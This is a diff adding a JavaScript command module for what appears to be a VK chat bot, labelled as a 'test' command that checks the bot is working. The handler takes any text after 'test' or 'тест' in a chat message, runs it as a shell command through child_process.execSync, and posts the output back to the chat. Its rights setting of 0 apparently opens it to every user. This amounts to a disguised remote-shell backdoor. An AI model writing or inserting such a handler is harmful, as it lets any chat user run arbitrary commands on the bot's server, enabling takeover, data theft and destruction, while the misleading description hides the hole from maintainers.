@@ -1,0 +1,17 @@
+﻿const child = require('child_process')
+const rand = require("../plugins/functions.js").rand
+module.exports = {
+	r: /(test|тест)\s([^]+)/i,
+	f: function (msg, args, vk, bot){
+		try{
+			var gone = child.execSync(args[2]).toString();
+		}catch (err){
+			var gone = err.toString()
+		}
+		return msg.send(gone);
+	},
+	desc: "тест -- проверка работоспособности бота",
+	rights: 0,
+	type: "all",
+	typ: "prosto"
+}
